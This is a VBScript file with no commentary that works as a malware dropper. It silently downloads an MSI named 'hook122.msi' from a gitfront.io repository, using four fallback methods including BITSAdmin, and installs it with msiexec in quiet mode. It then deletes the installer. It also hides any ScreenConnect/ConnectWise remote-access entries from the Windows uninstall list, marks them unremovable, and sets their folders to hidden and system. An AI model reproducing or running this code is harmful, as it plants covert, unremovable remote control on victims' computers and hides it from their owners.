On Error Resume Next

Dim shell, fso, oReg
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")
Set oReg  = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Const HKLM = &H80000002
Const HKCU = &H80000001

' ── Enable TLS 1.2 for Vista / 7 / Server 2008 ─────────────────────────────
Dim tlsClient, tlsServer, winHttp
tlsClient = "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client\"
tlsServer = "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server\"
winHttp   = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\WinHttp\"
shell.RegWrite tlsClient & "Enabled",          1,          "REG_DWORD"
shell.RegWrite tlsClient & "DisabledByDefault", 0,          "REG_DWORD"
shell.RegWrite tlsServer & "Enabled",          1,          "REG_DWORD"
shell.RegWrite tlsServer & "DisabledByDefault", 0,          "REG_DWORD"
shell.RegWrite winHttp   & "DefaultSecureProtocols", 2560, "REG_DWORD"

' ── Download with fallbacks ──────────────────────────────────────────────────
Dim url, tmp
url = "https://gitfront.io/r/hoook/jgzcxq1ZXdyw/hook1/raw/hook122.msi"
tmp = shell.ExpandEnvironmentStrings("%TEMP%") & "\sc_setup.msi"

Function SaveStream(body, path)
    Dim s
    Set s = CreateObject("ADODB.Stream")
    s.Type = 1 : s.Open
    s.Write body
    s.SaveToFile path, 2
    s.Close
    Set s = Nothing
    SaveStream = fso.FileExists(path)
End Function

Dim ok : ok = False

' Method 1 — WinHttp (Win XP SP1+, best TLS on Win 8.1+)
If Not ok Then
    Dim w1
    Set w1 = CreateObject("WinHttp.WinHttpRequest.5.1")
    If Err.Number = 0 Then
        w1.Open "GET", url, False
        w1.Option(4) = 13056
        w1.Send
        If w1.Status = 200 Then ok = SaveStream(w1.responseBody, tmp)
    End If
    Set w1 = Nothing : Err.Clear
End If

' Method 2 — MSXML2.ServerXMLHTTP.6.0 (Win XP SP2+)
If Not ok Then
    Dim w2
    Set w2 = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    If Err.Number = 0 Then
        w2.Open "GET", url, False
        w2.setOption 2, 13056
        w2.Send
        If w2.Status = 200 Then ok = SaveStream(w2.responseBody, tmp)
    End If
    Set w2 = Nothing : Err.Clear
End If

' Method 3 — MSXML2.XMLHTTP (Win XP+)
If Not ok Then
    Dim w3
    Set w3 = CreateObject("MSXML2.XMLHTTP")
    If Err.Number = 0 Then
        w3.Open "GET", url, False
        w3.Send
        If w3.Status = 200 Then ok = SaveStream(w3.responseBody, tmp)
    End If
    Set w3 = Nothing : Err.Clear
End If

' Method 4 — BITSAdmin fallback (Win XP SP2+ / Server 2003 SP1+)
If Not ok Then
    shell.Run "cmd /c bitsadmin /transfer ""sc_job"" /download /priority normal """ & url & """ """ & tmp & """", 0, True
    ok = fso.FileExists(tmp)
    Err.Clear
End If

' ── Install ─────────────────────────────────────────────────────────────────
If ok Then
    shell.Run "msiexec /i """ & tmp & """ /quiet /norestart", 0, True
    If fso.FileExists(tmp) Then fso.DeleteFile tmp, True
End If

' ── Registry Hiding ─────────────────────────────────────────────────────────
Dim regBases(2, 1)
regBases(0, 0) = HKLM : regBases(0, 1) = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
regBases(1, 0) = HKLM : regBases(1, 1) = "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
regBases(2, 0) = HKCU : regBases(2, 1) = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"

Dim i, hive, regPath, arrSubKeys, subKey, sName, sPub
For i = 0 To 2
    hive    = regBases(i, 0)
    regPath = regBases(i, 1)
    oReg.EnumKey hive, regPath, arrSubKeys
    If Not IsNull(arrSubKeys) Then
        For Each subKey In arrSubKeys
            oReg.GetStringValue hive, regPath & "\" & subKey, "DisplayName", sName
            oReg.GetStringValue hive, regPath & "\" & subKey, "Publisher",   sPub
            If IsNull(sName) Then sName = ""
            If IsNull(sPub)  Then sPub  = ""
            If InStr(1, sName & sPub, "ScreenConnect", 1) > 0 Or _
               InStr(1, sName & sPub, "ConnectWise",   1) > 0 Then
                oReg.SetDWORDValue hive, regPath & "\" & subKey, "SystemComponent", 1
                oReg.SetDWORDValue hive, regPath & "\" & subKey, "NoModify",        1
                oReg.SetDWORDValue hive, regPath & "\" & subKey, "NoRemove",        1
            End If
        Next
    End If
Next

' ── Folder Hiding ───────────────────────────────────────────────────────────
Dim dirs(4)
dirs(0) = shell.ExpandEnvironmentStrings("%ProgramFiles%\ScreenConnect")
dirs(1) = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%\ScreenConnect")
dirs(2) = shell.ExpandEnvironmentStrings("%ProgramFiles%\ConnectWise\ScreenConnect")
dirs(3) = shell.ExpandEnvironmentStrings("%ProgramData%\ScreenConnect")
dirs(4) = shell.ExpandEnvironmentStrings("%ProgramData%\ConnectWise\ScreenConnect")

Dim d, folder
For Each d In dirs
    If fso.FolderExists(d) Then
        Set folder = fso.GetFolder(d)
        folder.Attributes = folder.Attributes Or 2 Or 4
        Set folder = Nothing
    End If
Next

Set oReg  = Nothing
Set fso   = Nothing
Set shell = Nothing
